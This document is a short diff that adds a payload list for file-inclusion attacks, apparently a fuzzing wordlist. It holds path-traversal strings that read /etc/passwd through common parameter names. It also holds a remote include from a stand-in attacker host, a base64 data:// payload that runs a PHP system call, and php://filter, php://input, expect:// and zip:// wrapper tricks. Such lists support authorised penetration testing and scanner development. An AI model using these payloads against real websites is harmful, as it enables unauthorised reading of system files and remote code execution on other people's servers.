@@ -1,0 +1,14 @@
+?page=../../etc/passwd
+?include=../../etc/passwd
+?file=../../etc/passwd
+?path=../../etc/passwd
+?template=../../etc/passwd
+?lang=../../etc/passwd
+?module=../../etc/passwd
+?view=../../etc/passwd
+?page=http://attacker.com/shell.txt
+?include=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+?file=php://filter/convert.base64-encode/resource=/etc/passwd
+?page=php://input
+?include=expect://id
+?file=zip://upload.zip%23shell.php
